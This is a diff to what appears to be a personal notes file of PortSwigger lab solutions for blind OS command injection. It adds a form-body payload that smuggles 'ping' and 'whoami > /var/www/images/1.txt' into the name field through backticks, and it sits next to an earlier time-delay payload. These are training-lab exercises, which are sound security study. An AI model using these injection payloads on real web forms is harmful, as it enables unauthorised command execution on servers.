@@ -10,3 +10,7 @@ solution:
 url: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
 solution: csrf=BnYgQDa9dPFIsVm5XDq89aGkABCMww1k&name=help`ping -c 10 127.0.0.1 ` &email=a%40haha.com&subject=hahaha&message=hahahahah
 
+[lab: Blind OS command injection with output redirection]
+url: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
+solution: csrf=7ERLUUOkiFmofY9vMPCk3yVr5CFYgqlV&name=test`ping -c 5 127.0.0.1; whoami > /var/www/images/1.txt`&email=test%40test.com&subject=hahaha&message=blahblahblah
+
